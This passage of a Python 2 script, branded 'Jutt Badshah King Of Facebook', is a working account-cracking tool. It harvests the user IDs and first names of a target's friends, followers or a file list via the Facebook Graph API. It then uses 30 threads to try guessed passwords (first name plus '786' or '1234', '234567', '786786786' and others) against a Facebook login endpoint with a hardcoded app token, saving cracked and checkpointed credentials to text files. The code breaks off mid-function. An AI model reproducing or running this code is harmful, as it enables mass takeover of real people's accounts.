        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif j_s == '2':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~ Auto Pass Followers Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
            print ('\x1b[1;93m~~~~ Auto Pass Followers Cracking ~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92mPress enter to try again \x1b[1;97m')
            jutt_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif j_s == '3':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;93m~~~~ Auto Pass File Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        try:
            idlist = raw_input(' \x1b[1;96m[+] File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found.')
            raw_input('\x1b[1;92mPress Enter To Back. \x1b[1;97m')
            jutt_crack()

    elif j_s == '0':
        brand_menu()
    else:
        print ('')
        print ('\x1b[1;97mChoose valid option')
        jc_s()
    print (' \x1b[1;92mTotal ids: \x1b[1;92m ' + str(len(id)))
    time.sleep(0.5)
    print (' \x1b[1;97mCrack Running\x1b[1;97m ')
    time.sleep(0.5)
    print (47 * '-')
    print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    def main(arg):
        user = arg
        uid, name = user.split('|')
        ua = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        try:
            pass1 = name.lower() + '786'
            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m')
                ok = open('JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m')
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    ok = open('JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '123'
                    data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        ok = open('JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '12'
                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            ok = open('JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '234567'
                            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                ok = open('JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = '223344'
                                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    ok = open('JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '334455'
                                    data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m')
                                        ok = open('JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m')
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '445566'
                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                        q = json.loads(data)
                                        if 'access_token' in q:
                                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m')
                                            ok = open('JUTT_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m')
                                            cp = open('JUTT_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '786786786'
                                            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass9+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                            q = json.loads(data)
                                            if 'access_token' in q:
                                                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m')
                                                ok = open('JUTT_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass9 + '\x1b[0;97m')
                                                cp = open('JUTT_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = '786000'
                                                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass10+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                                q = json.loads(data)
                                                if 'access_token' in q:
                                                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m')
                                                    ok = open('JUTT_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass10 + '\x1b[0;97m')
                                                    cp = open('JUTT_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print (47 * '-')
    print (' \x1b[1;92mCrack Done')
    print (' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps)))
    print (47 * '\033[1;97m-')
    raw_input(' \x1b[1;93mPress enter to back\x1b[0;97m')
    brand_menu()


def brand_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print (logo)
        print ('\x1b[1;93m~~~ Login FB id to continue ~~~')
        time.sleep(1)
        log_menu()

    os.system('clear')
    print (logo)
    print("")
    print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
    print (47*'-')
    print ('\x1b[1;33m~~~~ Digit Choice Pass Cracking ~~~~\x1b[1;97m')
    print (47 * '-')
    print ('\x1b[1;92m[1] Public id cloning')
    print ('\x1b[1;92m[2] Followers cloning')
    print ('\x1b[1;92m[3] File cloning')
    print ('\x1b[1;92m[0] Back\x1b[1;97m')
    print (47 * '-')
    bc_s()


def bc_s():
    id = []
    cps = []
    oks = []
    bcs = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if bcs == '1':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m ~~~~Digit Choice Pass Public cracking~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96m For example:234567,223344,334455,445566\x1b[1;97m')
        print (47 * '-')
        pass1 = raw_input(' \x1b[1;92m[1]Password: \x1b[1;37m')
        pass2 = raw_input(' \x1b[1;92m[2]Password: \x1b[1;37m')
        pass3 = raw_input(' \x1b[1;92m[3]Password: \x1b[1;37m')
        pass4 = raw_input(' \x1b[1;92m[4]Password: \x1b[1;37m')
        pass5 = raw_input(' \x1b[1;92m[5]Password: \x1b[1;37m')
        pass6 = raw_input(' \x1b[1;92m[6]password: \x1b[1;37m')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m ~~~~ Digit Choice Pass Public Cracking ~~~~\x1b[1;97m')
            print (47*'-')
            print ("")
            print ('\x1b[1;92m Cloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92m Press enter to try again ')
            brand_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif bcs == '2':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~Digit Choice Pass Followers Cracking~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96m For example:234567,223344,334455,445566\x1b[1;97m')
        print (47 * '-')
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        idt = raw_input(' \x1b[1;96mEnter id: \x1b[0;97m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~~ Digit Choice Pass Followers Cracking ~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print ('\x1b[1;92m Cloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92mPress enter to try again ')
            brand_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif bcs == '3':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m ~~~~Digit Choice Pass File cracking~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96m For example:234567,223344,334455,445566\x1b[1;97m')
        print (47 * '-')
        pass1 = raw_input(' \x1b[1;92m[1]Password: \x1b[1;37m')
        pass2 = raw_input(' \x1b[1;92m[2]Password: \x1b[1;37m')
        pass3 = raw_input(' \x1b[1;92m[3]Password: \x1b[1;37m')
        pass4 = raw_input(' \x1b[1;92m[4]Password: \x1b[1;37m')
        pass5 = raw_input(' \x1b[1;92m[5]Password: \x1b[1;37m')
        pass6 = raw_input(' \x1b[1;92m[6]Password: \x1b[1;37m')
        try:
            idlist = raw_input(' \x1b[1;96m[+] File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found.')
            raw_input('\x1b[1;92mPress Enter To Back. ')
            brand_crack()

    elif bcs == '0':
        jutt_menu()
    else:
        print ('')
        print ('\x1b[1;97m Choose valid option')
        bc_s()
    print (' \x1b[1;92mTotal ids: \x1b[1;92m ' + str(len(id)))
    time.sleep(0.5)
    print (' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    def main(arg):
        user = arg
        uid, name = user.split('|')
        ua = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        try:
            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m')
                ok = open('JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m')
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    ok = open('JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        ok = open('JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            ok = open('JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                ok = open('JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    ok = open('JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print (47 * '-')
    print (' \x1b[1;92mCrack Done')
    print ('\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps)))
    print (47 * '\x1b[1;97m-')
    raw_input('\x1b[1;93m Press enter to back\x1b[0;97m')
    brand_menu()


def fast_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print (logo)
        print ('\t Login FB id to continue\x1b[0;97m')
        print ('')
        time.sleep(1)
        log_menu()

    os.system('clear')
    print (logo)
    print("")
    print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
    print (47*'-')
    print ('\x1b[1;33m~~~~ Name + Digit Pass Cracking ~~~~\x1b[1;97m')
    print (47 * '-')
    print ('\x1b[1;92m[1] Public id cloning')
    print ('\x1b[1;92m[2] Followers cloning')
    print ('\x1b[1;92m[3] File cloning')
    print ('\x1b[1;92m[0] Back\x1b[1;97m')
    print (47 * '-')
    fc_s()


def fc_s():
    id = []
    cps = []
    oks = []
    f_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if f_s == '1':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~Name + Digit Pass public cracking~~~~\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;93m~~~Name + Number Pass Public Cracking~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
